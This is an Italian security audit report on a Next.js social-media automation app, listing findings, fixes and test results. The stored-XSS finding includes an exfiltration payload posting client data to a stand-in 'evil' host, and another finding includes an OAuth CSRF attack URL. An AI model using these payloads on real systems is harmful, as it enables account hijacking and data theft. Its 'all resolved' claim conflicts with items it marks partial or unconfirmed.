# AUDIT REPORT — Social Web Automation

**Data:** 2026-08-28
**Commit auditato:** `c437f64` (origin/main)
**Destinatario:** Codex (autore del codice)
**Metodo:** audit statico in tre tracce parallele — pipeline editoriale, API/sicurezza, build/config. I finding marcati **[VERIFICATO]** sono stati riletti riga per riga nel codice; quelli marcati **[DA CONFERMARE]** dipendono da contesto runtime o di deploy non ispezionabile staticamente.

---

> **Stato dei fix (2026-08-28, sessione di audit).** **23 finding su 23 affrontati.** Tutti i bug sono corretti.
> **C1 è stato risolto restando su Vercel** e verificato in locale con un render reale; manca solo la conferma su un deploy di produzione.
> Verificato dopo i fix: `npx tsc --noEmit` pulito · `npm test` **22/22** (4 test nuovi sull'allowlist host) · `npm run lint` con i soli 2 warning preesistenti · `npm run build` completa.
> **C1 — cosa è stato fatto:** (1) `outputFileTracingIncludes` per `remotion/**` e `.remotion-bundle/**`, così i sorgenti della composizione e il bundle finiscono davvero nella lambda; (2) il bundle Remotion è ora **pre-buildato in fase di build** da `scripts/ensure-remotion-browser.mjs` invece di essere compilato con webpack a ogni cold start; (3) `VERCEL_SUPPORT_LARGE_FUNCTIONS=1` impostata su Production, che alza il tetto del bundle da 250 MB a 5 GB (Chromium pesa 193 MB). Verificato in locale: `npm run test:render` renderizza un MP4 reale in ~16s usando il bundle pre-buildato, e il tracing della funzione contiene bundle (68 file), sorgenti (2) e Chromium (18). **Resta da confermare con un deploy reale.**
>
> **Trappola trovata e documentata:** rimuovere i file `.map` dal bundle (12 MB su 31) sembra un'ottimizzazione ovvia ma **rompe il render**: Remotion legge le source map in `prepareServer` e `selectComposition` muore con `ENOENT: bundle.js.map`. Il commento nello script lo dice esplicitamente.
>
> Due voci sono chiuse con una scelta esplicita anziché con una modifica: **B5** (user enumeration accettata: in un flusso di pagamento una risposta generica farebbe pagare due volte; mitigata dal rate-limit) e **M4** (i due difetti sono corretti, ma resta da decidere se rimuovere il file, oggi non referenziato).
> La **migration 044 (A4) è stata applicata in produzione** sul progetto Supabase `npxtaciwuzkzgiqonhgo` e verificata: colonne, constraint e indice presenti, riga registrata in `schema_migrations` col checksum del runner.

## Sommario esecutivo

| Gravità | Totale | Risolti | Aperti |
|---|---|---|---|
| Critico | 4 | 4 | 0 |
| Alto | 7 | 7 | 0 |
| Medio | 7 | 7 | 0 |
| Basso | 5 | 5 | 0 |

**Il codice è, nel complesso, hardenato bene.** Nessuna SQL injection: tutte le query sono parametrizzate e le poche interpolazioni passano da whitelist di colonne. Il webhook Stripe verifica HMAC e tolleranza timestamp. Nessun segreto hardcoded o loggato. Lo scoping `cliente_id` è sistematico. Rate-limit anti-spoofing XFF e SSRF guard sugli scraper sono già presenti.

I problemi si concentrano in tre aree, tutte introdotte o toccate dai commit recenti della pipeline editoriale:

1. **Una decisione architetturale mai presa**: la pipeline di rendering Remotion non poteva funzionare su Vercel serverless — ed era già rotta in produzione. Risolta restando su Vercel; vedi la sezione dedicata.
2. **Due falle di sicurezza sfruttabili da un utente autenticato qualsiasi**: XSS stored via upload presigned, e CSRF sul flow OAuth Meta.
3. **La logica di assegnazione dei media importati da cartella produce contenuti duplicati e accoppiamenti sbagliati**, in silenzio, senza alcun contatore o warning nella risposta API.

---

## CRITICO

### C1 — ⚠️ RISOLTO IN LOCALE, DA CONFERMARE IN PRODUZIONE — Remotion su Vercel serverless
**[VERIFICATO — target deploy confermato Vercel]**

`lib/remotion-renderer.ts:5-6,135` → importato da `lib/publish/schedule.ts:13` → usato da tre route serverless: `app/api/data/calendario/route.ts:5`, `app/api/data/calendario/[id]/sync-uno/route.ts:5`, `app/api/data/blotato-sync/route.ts:4`.

Quattro problemi indipendenti, ciascuno sufficiente a rompere il rendering in produzione:

- **Chromium non c'è a runtime.** `scripts/ensure-remotion-browser.mjs` scarica headless-shell (~150-300 MB) nella *build sandbox*, non nel filesystem della lambda. A runtime `renderMedia` prova a scaricarlo su `/var/task`, che è read-only.
- **Limite dimensione lambda.** `serverExternalPackages` (`next.config.mjs:57`) esclude correttamente i pacchetti dal bundle, ma Chromium + ffmpeg superano comunque i 250 MB unzipped.
- **`bundle()` fa un build webpack a runtime.** Scrive su disco (`mkdtemp`/`writeFile`); su Vercel solo `/tmp` è scrivibile (512 MB) ed è effimero. La cache `bundlePromise` (`remotion-renderer.ts:11`) si perde a ogni cold start, quindi ogni invocazione ricompila.
- **Nessun `maxDuration`.** Le tre route non lo dichiarano (a differenza di `app/api/agents/*`, che hanno 300). Default 10s Hobby / 15s Pro: un render video li eccede sistematicamente.

**Segnale di ambiguità nel repo:** `package.json:9` ha `"start": "node scripts/render-start.mjs"`, esistono `prod:check` e `render-sync-env`, e `README.md:10` dice che «il deploy Render esegue `npm run migrate` prima dello start». Il progetto sembra scritto per **Render** (container persistente, dove Remotion funziona), ma non esiste `render.yaml` e la directory `.vercel/` è presente. **Va chiarito quale sia il target reale prima di toccare qualsiasi altra cosa.**

---

### C2 — ✅ RISOLTO — Stored XSS via presigned upload: il Content-Type è scelto dal client e riflesso dal proxy
**[VERIFICATO]**

`app/api/assets/presign/route.ts:60-86` + `lib/storage.ts:93-99` + `app/api/assets/file/[clienteId]/[filename]/route.ts:110`

La catena completa:

1. `mediaKind(mime)` valida solo il MIME **dichiarato nel JSON**. Per le immagini non vincola l'estensione — il check su estensione esiste solo per video (`.mp4`) e audio, righe 66-74.
2. `safeFilename()` conserva l'estensione originale.
3. `presignPutUrl(key)` firma un PUT **senza vincolare `Content-Type` né `Content-Length`**. Il commento in `lib/storage.ts:89-90` lo dice esplicitamente: «Content-Type resta header non firmato: il browser lo manda comunque e lo storage lo memorizza».
4. Alla lettura il proxy fa `MIME_BY_EXT[ext] || obj.contentType` — per un'estensione fuori mappa (`.html`, `.svg`) si ricade sul Content-Type **salvato dall'attaccante**.

**Sfruttamento.** Utente autenticato qualsiasi — anche un cliente finale, non serve admin:

```
POST /api/assets/presign  {name:"x.html", mime:"image/png"}
→ riceve uploadUrl
PUT <uploadUrl>  Content-Type: text/html
   body: <script>fetch('/api/data/clienti').then(r=>r.json()).then(d=>fetch('https://evil/',{method:'POST',body:JSON.stringify(d)}))</script>
```

L'URL risultante `/api/assets/file/<cid>/x-<token>.html` è **pubblico e senza auth** (by-design, righe 8-15 della route) e serve HTML sull'origine dell'app. La CSP (`next.config.mjs:16`) include `'unsafe-inline'` su `script-src`, quindi lo script esegue. Inviato a un admin: esfiltra i dati di tutti i clienti a cui ha accesso e agisce come lui sulle API — il cookie httpOnly non protegge da questo.

Con bucket pubblico (`STORAGE_PUBLIC_URL` impostato) l'XSS finisce su `*.supabase.co` invece che sull'origine app: impatto minore, non nullo.

**Fix:** whitelist di estensioni allineata a `MIME_BY_EXT`; firmare il presign con `Content-Type` vincolato; sul proxy usare `MIME_BY_EXT[ext] || 'application/octet-stream'` (come già fa il ramo disco, riga 121) più `Content-Disposition: attachment` per gli sconosciuti.

---

### C3 — ✅ RISOLTO — OAuth CSRF su Meta: lo `state` trasporta il clienteId, non è un nonce
**[VERIFICATO]**

`app/api/social/connect/route.ts:20` e `app/api/social/callback/route.ts:14-19`

Lo `state` è `encodeURIComponent(clienteId)` — valore **stabile e riutilizzabile**, non un token casuale legato alla sessione. Il commento nel codice («state porta il cliente: sul callback verifichiamo l'accesso») rivela l'assunzione sbagliata: si verifica *l'autorizzazione della vittima su quel cliente*, non *l'intenzionalità della richiesta*. Il callback è una `GET`, quindi il cookie NextAuth (`SameSite=Lax`) viene inviato anche su navigazione top-level cross-site.

**Sfruttamento.** L'attaccante avvia il flow OAuth Meta col proprio account Instagram, intercetta il `code` senza consumarlo, poi induce un admin loggato a visitare:

```
https://app/api/social/callback?code=<code_attaccante>&state=<clienteId_vittima>
```

`requireClienteAccess` passa (la vittima *ha* accesso a quel cliente) e l'account Instagram **dell'attaccante** viene salvato in `social_accounts` per il workspace della vittima (righe 31-42). Conseguenza: i contenuti approvati del cliente vengono pubblicati sull'account dell'attaccante, e le metriche mostrate al cliente sono quelle dell'attaccante. Il `clienteId` è un UUID ma è esposto in chiaro negli URL `/api/assets/file/<clienteId>/...` e a qualsiasi co-tenant.

**Fix:** `state` = nonce casuale in cookie httpOnly a vita breve, con il clienteId in un lookup server-side.

---

### C4 — ✅ RISOLTO — `NEXT_PUBLIC_DEMO_MODE=true` disattiva tutta l'auth anche con un DATABASE_URL reale
**[VERIFICATO]**

`middleware.ts:105`, `lib/auth-utils.ts:16-19,50,80,103`, `lib/auth.ts:26-31`, `lib/demo.ts:3`

`if (isDemo()) return NextResponse.next()` bypassa ogni controllo del middleware. A valle: `requireAuth()` restituisce un finto `demo-user`, `requireClienteAccess()` restituisce **qualunque id richiesto** senza verifica, `requireAdmin()` passa sempre. `isDemo()` guarda solo il flag, **non** se `DATABASE_URL` è configurato. In più `AUTH_SECRET` degrada a `'dev-secret-change-in-development'` (`lib/auth-secret.ts:9`).

**Scenario:** il flag resta acceso (o viene acceso per una demo) su un deploy con DB di produzione → l'intera API, comprese `/api/admin/*` e `/api/data/*` di ogni cliente, diventa leggibile e scrivibile da un anonimo.

È documentato come pericoloso nei commenti e in `.env.example`, ma non c'è alcun guard runtime. **Fix:** fail-closed, es. `if (DEMO && dbReady() && NODE_ENV === 'production') throw`.

---

## ALTO

### A1 — ✅ RISOLTO — Media di cartella duplicati su tutti i blocchi settimanali → contenuti doppi
**[VERIFICATO]**

`app/api/generate/plan/route.ts:656-691`, chunk definiti a `589-609` e `619-639`

```js
chunk.images = mediaPool.filter(url => placement && chunk.week === placement.week)
```

Nei rami settimanali a **due blocchi** (pacchetto Crescita, e quality medium/high) **entrambi i chunk hanno `week: 1`** — righe 601 e 609, confermate. Ogni asset di "Settimana 1" finisce identico in tutti e due i chunk, e `chunk.targetMin/targetMax = imported.size` (righe 686-691) viene applicato a entrambi.

**Scenario:** import cartella con 16 gruppi (Reel 01…, Carosello 01…) tutti "Settimana 1", piano settimanale Crescita → `buildFolderCampaignContext` elenca gli stessi 16 gruppi in due blocchi → l'AI genera 32 card, di cui 16 duplicati dello stesso concept su date diverse. Peggio: `usedMedia` è scoped per `Chunk` (righe 1161-1174), quindi il secondo blocco riassegna **gli stessi identici URL media** — `claimedFolderGroups` blocca solo il ramo cartella (riga 1244) e il flusso ripiega sul path generico (riga 1272+). In DB: contenuti duplicati con media identici, nessun contatore né segnalazione nella risposta API.

**Variante correlata:** piano mensile con `fase` (riga 576, `settimane = [0,1]` o `[2,3]`) — gli asset con `week` 3/4 non combaciano con nessun chunk, cadono in `remaining` (riga 666) e vengono distribuiti a round-robin nelle settimane 1-2, gonfiando `targetMax` e producendo card nella settimana sbagliata.

---

### A2 — ✅ RISOLTO — Lock rubabile dopo 15 min e UPDATE post-render mai verificato → MP4 orfano, riga bloccata
**[VERIFICATO]**

`lib/publish/schedule.ts:206-221` (acquisizione) e `320-345` (rilascio)

Il lock scade con `updated_at < now() - interval '15 minutes'`, ma **il render Remotion avviene dentro il lock** e può durare di più (video sorgente lungo, coda ffmpeg, cold start del bundle). Nel frattempo un secondo processo (cron sync, click su "Sincronizza") ruba il lock e avvia un secondo render.

Quando il primo processo finisce, l'UPDATE (righe 322 e 334) ha `AND publish_lock_id = $6`: **non aggiorna nulla, il risultato di `q()` viene scartato e nessuno controlla il rowcount**. La funzione ritorna comunque `{ status: 'visual_review', mediaUrl }` come se fosse andata bene.

**Stato risultante:** MP4 caricato su storage ma non referenziato in `blotato_visual_media_url`; riga ferma in `DA_APPROVARE` senza visual da approvare; l'utente rivede lo stesso ciclo all'infinito. Stessa mancanza di verifica nell'UPDATE di rilascio dentro il `catch` (righe 452-458).

**Fix:** controllare il rowcount e, se zero, ritornare un esito esplicito (`lock_lost`) invece di `visual_review`; oppure rinnovare il lock periodicamente durante il render.

---

### A3 — ⚠️ PARZIALE — Render sincrono dentro la request HTTP, durata sorgente non limitata, loop sequenziale
**[VERIFICATO]**

`lib/remotion-renderer.ts:63-70,88-178` + `app/api/data/blotato-sync/route.ts:94-101`

- `resolveDuration` (righe 63-70) accetta **qualsiasi** durata del video sorgente senza cap. Il path immagini è invece limitato a 20s da `imageVideoDurationInSeconds`. Un MP4 da 8 minuti caricato dall'utente (limite upload 100 MB, `assets/upload/route.ts:14`) → `durationInFrames = 14400` → `renderMedia` a 1080×1920 h264 per decine di minuti, dentro una request HTTP.
- `blotato-sync` cicla le righe **in serie** con `await scheduleOnBlotato(...)`: 10 reel da montare = 10 render in una sola richiesta.
- Se il processo viene killato per timeout, il `finally` (righe 175-177) non esegue: la temp dir `swa-remotion-*` in `tmpdir()` resta, e il `publish_lock_id` resta impostato per 15 minuti (vedi A2).
- **Memoria:** `readFile(outputLocation)` (riga 154) carica l'intero MP4 in un Buffer prima dell'upload, in aggiunta al buffer che `uploadToStorage` ricrea (`new Uint8Array(bytes)`).

**Fix:** cap sulla durata sorgente (es. 90s), render fuori dalla request (queue/worker), streaming invece di `readFile`.

---

### A4 — ✅ RISOLTO — Migration 044 non applicata: nessun deploy Vercel esegue le migrazioni
**[VERIFICATO]**

`db/migrations/044_campaign_folder_import.sql` esiste ma non viene mai applicata in automatico: l'unico punto che lancia il runner è `scripts/render-start.mjs:55` (`spawnSync(... 'scripts/run-migrations.mjs')`), cioè lo start di **Render**. Su Vercel non viene mai invocato.

Il file è idempotente (`ADD COLUMN IF NOT EXISTS`, guard su `pg_constraint`, `CREATE INDEX IF NOT EXISTS`), quindi rieseguirlo è sicuro.

```bash
DIRECT_DATABASE_URL=... npm run migrate -- --file 044_campaign_folder_import.sql
```

Nota di allineamento doc: `HANDOFF.md:14` dice ancora «Migrazioni in `db/migrations/` (001–043)».

---

### A5 — ✅ RISOLTO — Takeover di una registrazione `pending` riscrivendo la password
**[DA CONFERMARE — dipende dal flusso di attivazione reale]**

`app/api/auth/register/route.ts:86-104`

Se esiste già un profilo con quella email e `status === 'pending'`, la route **sovrascrive `password_hash`** (righe 94-103) senza alcuna prova di possesso dell'email — non c'è verifica email in tutto il flow.

**Scenario:** la vittima si registra e abbandona o ritarda il checkout Stripe (resta `pending`). L'attaccante ri-registra la stessa email impostando la propria password. La vittima completa il proprio pagamento (la Checkout Session porta `metadata.profile_id` creato prima) → il webhook chiama `activateRegistration` → `status='active'` con la **password dell'attaccante**. La vittima paga, l'attaccante entra. Stesso effetto se l'admin attiva manualmente da `/api/admin/registrazioni`.

**Fix:** non riscrivere mai `password_hash` su un profilo esistente; richiedere verifica email o un token di ripresa registrazione.

---

### A6 — ✅ RISOLTO — Qualsiasi utente autenticato può creare workspace illimitati scegliendosi il piano
**[VERIFICATO]**

`app/api/data/clienti/route.ts:42-67`

La `PATCH` protegge correttamente i campi commerciali (`CLIENTE_ADMIN_COLUMNS` + `requireAdmin()`, righe 95-96). La `POST` **no**: richiede solo `requireAuth()`, accetta `piano` dal body (riga 45), lo usa per derivare `pacchetto` e `contenuti_mese` (righe 55-60), e inserisce l'utente come `owner` in `user_client_access`.

**Sfruttamento:** un cliente sul pacchetto "presenza" (16 contenuti/mese) chiama `POST /api/data/clienti {nome:"x", piano:"crescita"}` → ottiene un workspace da 24 contenuti/mese, ne crea N in loop, poi cambia il cookie `active_cliente_id` e genera contenuti AI su ognuno. Nessun cap, nessuna fatturazione, costo AI a carico dell'agenzia. Il middleware non blocca: `/api/data` richiede solo la presenza di un token, e il redirect `/dashboard` → `/portale` (`middleware.ts:151`) è protezione di UI, non di API.

**Fix:** `requireAdmin()` sulla POST, oppure derivare `piano`/`contenuti_mese` server-side dall'abbonamento Stripe dell'utente, ignorando il body.

---

### A7 — ✅ RISOLTO — `node_modules` stale: la build locale è rotta adesso
**[VERIFICATO]**

`package.json:7` (`"build": "npm run remotion:browser && next build"`)

`remotion`, `@remotion/bundler` e `@remotion/renderer` sono dichiarati in dependencies ma **assenti da `node_modules/`**. `package.json` e `package-lock.json` hanno mtime 28 Aug 19:07, `node_modules` è del 1 Aug 12:59. Il primo step della build (`scripts/ensure-remotion-browser.mjs:3`, `import { ensureBrowser } from '@remotion/renderer'`) fallisce con MODULE_NOT_FOUND prima ancora di `next build`.

**Fix:** `npm ci`. Banale, ma blocca qualsiasi verifica locale finché non è fatto — da eseguire per primo.

---

## MEDIO

### M1 — ✅ RISOLTO — Il gruppo cartella "sbagliato" viene assegnato in silenzio
**[VERIFICATO]** — `app/api/generate/plan/route.ts:1236-1265`

```js
const contentKeyMatch = normalizedContentKey
  ? [...folderGroups.keys()].find(key => key === `${chunk.week}:${canale}:${normalizedContentKey}`)
  : ''
...
const selectedKey = preferredKey && availableKeys.includes(preferredKey) ? preferredKey : availableKeys[0]
```

Due difetti sommati:

- `contentKeyMatch` costruisce la chiave con **`chunk.week`**, mentre `folderGroups` è costruito con **`placement.week`** (riga 1219). Dopo la ridistribuzione delle righe 666-668 un asset può stare in un chunk con `week` diverso dal proprio placement → il match per `content_key` fallisce sempre e si cade nel fallback.
- Il fallback `availableKeys[0]` (primo gruppo in ordine alfabetico non ancora reclamato) accoppia il copy di un contenuto ai **media di un altro contenuto**, senza alcun contatore nella risposta.

**Scenario:** il modello restituisce due item con `content_key: "reel_01"` (ripetizione tipica). Il primo reclama `1:instagram:reel_01`; il secondo, che parla di un Reel, riceve i media di `1:instagram:carosello_01` e finisce in calendario come reel con le slide del carosello.

### M2 — ✅ RISOLTO — Collisione nomi upload: cover e file senza sequenza si sovrascrivono
**[VERIFICATO]** — `app/dashboard/piano/page.tsx:260-265,279-304`

```js
const sequence = a.sequence ? String(a.sequence).padStart(2, '0') : '00'
```

`sequence === 0` (la cover, `campaign-folder.ts:98`) è **falsy** e produce `"00"`, esattamente come `sequence === null`. In `Settimana 1/Instagram/Reel 01/` con `cover.jpg` (seq 0) e `scena.jpg` (seq null) entrambi diventano `w1-instagram-reel_01-00.jpg`; `uploadedNames.set(uploadFile.name, entry)` (riga 284) tiene solo l'ultimo, quindi **entrambi** gli asset ereditano metadati e `prettyName` dello stesso file. La deduplica (righe 240-250) non intercetta il caso perché salta esplicitamente i candidati con `sequence === null`. A valle: `placement.sequence` sbagliato → ordinamento slide/scene errato in `nextChunkMediaSlots` (righe 1247-1251).

**Correlato (riga 273):** `entries.slice(0, MAX_PLAN_IMAGES - planAssets.length)` con `planAssets.length === MAX_PLAN_IMAGES` dà `slice(0, 0)` → upload silenziosamente a vuoto, nessun errore mostrato. Il gate `exceedsLimit` copre solo il bottone cartella, non `uploadPlanImages`.

### M3 — ✅ RISOLTO — Ogni richiesta Range scarica l'intero oggetto dallo storage
**[VERIFICATO]** — `app/api/assets/file/[clienteId]/[filename]/route.ts:104-113`

`downloadFromStorage(key)` restituisce **tutti** i byte, poi `bytesResponse` fa `bytes.subarray(start, end+1)`. Blotato e i player HTML della preview fanno richieste Range multiple su un MP4: un reel da 60 MB con 20 richieste Range = 1,2 GB scaricati dal bucket e allocati in heap, in un processo che sta anche facendo render Remotion. È esattamente il percorso usato dai video generati, perché `renderSwaSocialVideo` ripiega su questo proxy quando il bucket è privato (`remotion-renderer.ts:158-160`). Rischio OOM / 502 in pubblicazione.

### M4 — ✅ RISOLTO (difetti) / ⚠️ DECISIONE APERTA (codice morto) — `blotato-visual.ts`: troncamento silenzioso a 5 slide e cache template globale
**[DA CONFERMARE — potrebbe essere codice morto]** — `lib/blotato-visual.ts:110,76-103`

- `photoReelBody`: `args.imageUrls.slice(0, 5)` scarta senza segnalazione le immagini oltre la quinta; il chiamante non distingue "montate tutte" da "montate 5 su 10".
- `photoReelTemplateCache` è module-level e **non indicizzata per `blotatoKey`**: il primo cliente che risolve il catalogo fissa l'ID per 5 minuti per tutti gli altri clienti/workspace del processo.

**Da chiarire:** allo stato attuale il modulo è referenziato **solo** da `lib/blotato-visual.test.ts` — la pipeline di pubblicazione usa ora Remotion (`schedule.ts:13`). Se la migrazione è conclusa, è codice morto da rimuovere e i due difetti sono latenti. Se `createAudioMixedVideo` deve ancora essere ricablato, sono attivi.

### M5 — ✅ RISOLTO — `/api/system/health` anonimo esegue DDL e più query DB a ogni richiesta
**[VERIFICATO]** — `app/api/system/health/route.ts:82-88,30`

Il body è correttamente ridotto per i non-admin (righe 83-89), ma **prima** di quel controllo la route chiama `ensureStandaloneServiceOrdersSchema()` (DDL idempotente) e `getDatabaseChecks()` (4 query, incluso un `EXISTS` su `profiles`). Nessun rate-limit copre `/api/system` in `middleware.ts`.

**Scenario:** un attaccante martella l'endpoint e satura il pool `pg` (`max: 5` per istanza, `lib/db.ts:51`), esaurendo le connessioni del pooler Supavisor → l'app va giù per gli utenti reali. Spostare DDL e query pesanti dopo il check `isAdmin`.

### M6 — ✅ RISOLTO — La CI non esegue mai i test
**[VERIFICATO]** — `.github/workflows/ci.yml`

Sei step (lint, build, npm audit, migrate:dry, smoke demo, prod:check:strict) e **nessuno lancia `npm test`**. Idem `package.json:18` (`ci:verify`). I test in `lib/*.test.ts` non girano mai in automatico — inclusi quelli scritti apposta per i fix recenti (`blotato-visual.test.ts`, `campaign-folder.test.ts`).

### M7 — ✅ RISOLTO — Due file di test orfani, mai eseguiti
**[VERIFICATO]** — `package.json:8`

`"test": "playwright test lib/*.test.ts --workers=1"` — il glob copre solo `lib/`, quindi `scripts/remotion-demo.test.ts` e `scripts/remotion-smoke.test.ts` non sono raggiunti da nessuno script. Entrambi importano `renderSwaSocialVideo`, cioè proprio il path pesante mai coperto.

---

## BASSO

### B1 — ✅ RISOLTO — Case-sensitivity incoerente su `formato`
**[DA CONFERMARE]** — `lib/publish/schedule.ts:93` vs `481,488,495`

`isStory` usa `formato.toLowerCase() === 'story'` (riga 93), ma `buildPlatformContent` confronta `formato` **grezzo**: `['reel','short','story'].includes(formato)` (481), `!['story'].includes(formato)` (488), `formato !== 'story'` (495).

Con `row.formato = 'Story'` si ottengono due verità opposte nella stessa funzione: il payload è trattato come story (niente `firstComment`, hashtag rimossi) ma il testo riceve CTA e `👉 link`, non cliccabili nelle story. Raggiungibile solo via edit manuale/PATCH — il generatore normalizza a lowercase in `sanitizeItem` (`plan/route.ts:1083-1084`). **Da verificare** se la PATCH di `app/api/data/calendario/route.ts` normalizzi il campo.

### B2 — ✅ RISOLTO — `getPublicBaseUrl` si fida di `x-forwarded-host`/`host`
**[DA CONFERMARE — dipende dalla topologia di deploy]** — `lib/base-url.ts:19-25`

L'header è validato solo come hostname sintattico, poi usato per costruire il `redirect_uri` OAuth (`social/callback/route.ts:20`), gli URL dei media salvati **in DB** (`generate/image/route.ts:78,83`; `assets/upload/route.ts:86,92`) e i link di approvazione (`data/approve/route.ts:113`).

Il commento afferma che dietro il proxy l'header non è manipolabile: vero su Render/Vercel che riscrivono `x-forwarded-*`, ma non più se si introduce un CDN o reverse proxy che li propaga. In quel caso `x-forwarded-host: evil.com` porta a scrivere in DB URL di media che puntano al dominio dell'attaccante — persistenti, riutilizzati dallo scheduler giorni dopo. Preferibile una allowlist di host.

### B3 — ✅ RISOLTO — `limit` non validato in `/api/data/calendario`
**[VERIFICATO]** — `app/api/data/calendario/route.ts:125,164-166`

`parseInt(searchParams.get('limit') || '50')` senza guard: `?limit=abc` → `NaN` in `LIMIT $n` → errore driver → 500. `?limit=999999999` restituisce l'intero calendario del tenant. Lo scoping `cliente_id = $1` regge, quindi non è un problema di autorizzazione. Clampare: `Number.isFinite(n) ? Math.min(Math.max(n,1), 500) : 50`.

### B4 — ✅ RISOLTO (documentato) — Buco nella numerazione delle migration: manca la 003
**[VERIFICATO]**

Presenti 001, 002, poi 004→044 senza altre interruzioni (41 file). La 003 non esiste e non è referenziata (le occorrenze di "003" sono solo il SKU `P003` in `002_seed.sql:77,79`). Il runner ordina per `localeCompare` sul nome, quindi il buco non rompe nulla, ma va documentato per evitare che qualcuno reintroduca una 003 fuori ordine.

### B5 — ⚠️ ACCETTATO — User enumeration in registrazione
**[VERIFICATO]** — `app/api/auth/register/route.ts:91`

409 «Esiste già un account con questa email» su tutti gli account attivi. Mitigato solo dal rate-limit 10/5min (`middleware.ts:88-91`).

---

## Fix applicati in questa sessione

Nessun fix è stato committato: sono tutti nel working tree, da rivedere prima del commit.

| ID | File toccati | Cosa è cambiato |
|---|---|---|
| C2 | `lib/storage.ts`, `app/api/assets/presign/route.ts`, `app/api/assets/file/[clienteId]/[filename]/route.ts` | `presignPutUrl(key, contentType)` ora firma il Content-Type (`allHeaders: true` — di default aws4fetch lo tiene in `UNSIGNABLE_HEADERS`, ed era esattamente la causa). Nuova `ALLOWED_EXT_BY_KIND`: l'estensione è validata per ogni kind, immagini incluse. Il proxy non riflette più `obj.contentType`: `MIME_BY_EXT[ext] || 'application/octet-stream'`, più `X-Content-Type-Options: nosniff` e `Content-Disposition: attachment` per le estensioni ignote. |
| C3 | `lib/oauth-state.ts` (nuovo), `app/api/social/connect/route.ts`, `app/api/social/callback/route.ts` | `state` = nonce casuale monouso; il clienteId viaggia in un cookie httpOnly `meta_oauth_state` (path `/api/social`, 10 min), confrontato in tempo costante e consumato sempre, anche in errore. |
| C4 | `lib/demo.ts` | In build di produzione con `DATABASE_URL` configurato, `NEXT_PUBLIC_DEMO_MODE=true` viene **ignorato** con log esplicito. Escape hatch per un deploy demo con DB: `DEMO_ALLOW_WITH_DB=true`. |
| A1 | `app/api/generate/plan/route.ts` | I media importati sono raggruppati per `settimana:social:contenuto` e i gruppi distribuiti a round-robin **tra i blocchi di quella settimana**: un asset appartiene a un solo blocco e le slide di un carosello restano unite. Gli asset di settimane senza blocco (piano per fasi) e quelli senza `week` tornano al pool generico. |
| A2 | `lib/publish/schedule.ts` | Gli UPDATE post-render hanno `RETURNING id` e il rowcount è controllato: se il lock è stato rubato durante il montaggio si ritorna `{status:'skipped'}` con motivo esplicito invece di un falso `visual_review`. |
| A3 (parziale) | `lib/remotion-renderer.ts`, `app/api/data/blotato-sync/route.ts`, `app/api/data/calendario/[id]/sync-uno/route.ts`, `app/api/data/calendario/route.ts` | Nuovo `MAX_SOURCE_VIDEO_SECONDS = 90` con errore azionabile sul sorgente troppo lungo. `maxDuration = 300` sulle tre route che possono renderizzare. **Restano aperti** il render sincrono dentro la request, il loop seriale e il `readFile` dell'intero MP4: si chiudono solo con la decisione su C1. |
| A5 | `app/api/auth/register/route.ts` | Il riuso di un profilo `pending` non riscrive più `password_hash`. Chi riprende un checkout abbandonato usa la password della prima registrazione o il recupero password. |
| A6 | `app/api/data/clienti/route.ts` | La POST richiede `requireAdmin()` se il body contiene `piano`, coerentemente con la PATCH e con `CLIENTE_ADMIN_COLUMNS`. |
| A7 | — | `npm ci` eseguito: `@remotion/*` ora presenti, build ripristinata. |
| M5 | `app/api/system/health/route.ts` | `isAdmin` risolto **prima** di qualunque accesso al DB; `ensureStandaloneServiceOrdersSchema()` (DDL) gira solo per admin. Le due query di liveness restano per l'healthcheck anonimo. |
| M6/M7 | `package.json`, `.github/workflows/ci.yml` | Nuovo step CI «2. Unit test» (`npm test`), aggiunto anche a `ci:verify`. I due test Remotion pesanti hanno ora uno script dedicato `test:render`, invece di restare irraggiungibili. |
| B3 | `app/api/data/calendario/route.ts` | `limit` clampato a `[1, 500]` con fallback 50 su valore non finito. |
| M1 | `app/api/generate/plan/route.ts` | `contentKeyMatch` confronta ora il contentKey del gruppo (con il canale) invece di ricostruire la chiave con `chunk.week`, che dopo la ridistribuzione non combaciava mai. Il fallback resta come rete di sicurezza ma incrementa `folderGroupMismatch`, esposto nella risposta come `items_gruppo_cartella_diverso`. |
| M2 | `app/dashboard/piano/page.tsx` | `sequence === 0` (cover) non collide più con `sequence === null` (`'00'` vs `'xx'`), e `nomeUnico()` garantisce nomi distinti dentro lo stesso batch. L'upload a limite saturo non è più un no-op silenzioso: messaggio esplicito, e i file scartati per il limite finiscono tra gli `skipped`. |
| M3 | `lib/storage.ts`, `app/api/assets/file/[clienteId]/[filename]/route.ts` | Nuova `downloadRangeFromStorage()`: l'header Range viene inoltrato allo storage e si scaricano solo i byte richiesti, invece di prendere l'oggetto intero e affettarlo. Gestito anche il 416. |
| M4 | `lib/blotato-visual.ts` | Cache template indicizzata per `blotatoKey` (era una variabile di modulo condivisa tra tutti i workspace). Il troncamento oltre `PHOTO_REEL_MAX_SLIDES` ora logga un warning. In testa al file una nota dice che il modulo è oggi senza chiamanti. |
| B1 | `lib/publish/schedule.ts` | Una sola normalizzazione `formatoNorm` in `buildPlatformContent`: niente più verità opposte tra `isStory` e i confronti sul valore grezzo. |
| B2 | `lib/base-url.ts`, `.env.example`, `lib/base-url.test.ts` (nuovo) | `x-forwarded-host` accettato solo se in allowlist: domini delle env, `*.vercel.app`, `*.onrender.com`, `ALLOWED_HOSTS`, più localhost fuori produzione. Altrimenti si ripiega sulla env. 4 test coprono il caso spoofing. |
| B4 | `HANDOFF.md` | Documentato il buco della 003: la prossima migration parte da 045. |
| B5 | `app/api/auth/register/route.ts` | Nessuna modifica funzionale: commento che spiega perché il 409 esplicito è una scelta e non una svista. |

**Verifica eseguita dopo i fix:** `npx tsc --noEmit` pulito · `npm test` 18/18 · `npm run lint` con i soli 2 warning preesistenti · `npm run build` completa.

**Non ancora verificato a runtime:** il flow OAuth Meta end-to-end (serve un'app Meta reale) e un upload presigned reale contro Supabase Storage — il vincolo sul Content-Type firmato va confermato con un PUT vero, perché un mismatch farebbe fallire l'upload con 403.

---

## Decisione architetturale da prendere: dove gira Remotion

C1 non si risolve con una patch. Le opzioni realistiche, senza raccomandazione — la scelta dipende da budget e da dove si vuole stare operativamente:

| Opzione | Cosa comporta | Trade-off |
|---|---|---|
| **Worker separato su container** (Render, Fly, Railway) | Le route Vercel accodano un job; un servizio persistente monta i video e richiama un webhook | Funziona davvero; richiede un secondo servizio, una coda e la gestione degli stati |
